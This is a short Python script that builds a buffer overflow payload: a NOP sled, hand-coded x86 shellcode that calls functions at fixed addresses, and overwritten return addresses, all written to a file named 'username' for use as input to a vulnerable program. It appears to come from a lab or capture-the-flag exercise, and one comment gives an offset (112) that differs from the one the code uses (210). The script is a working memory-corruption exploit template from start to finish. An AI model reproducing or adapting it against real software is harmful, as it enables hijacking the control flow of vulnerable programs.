import sys 
 
shellcode= ( 
"\x68\x60\xC8\x55\x56\x68\x60\xC8\x55\x56\xBB\x15\x63\x55\x56\xFF\xD3\x6A\x04\x68\x88\x80\x08\x08\xBB\x8D\x62\x55\x56\xFF\xD3"
).encode('latin-1') 
 
# Fill the content with NOPs 
content = bytearray(0x90 for i in range(600)) 
# Put the shellcode at the end 
start = 600 - len(shellcode) 
content[start:] = shellcode 
 
# Put the address at offset 112 
ret = 0xffffc6f8 + 150 
content[210:214] = (ret).to_bytes(4,byteorder='little')
ret = 0x5655c860
content[214:218] = (ret).to_bytes(4,byteorder='little')
ret = 0x5655c860
content[218:222] = (ret).to_bytes(4,byteorder='little') 
 
# Write the content to a file 
with open('username', 'wb') as f: 
    f.write(content) 

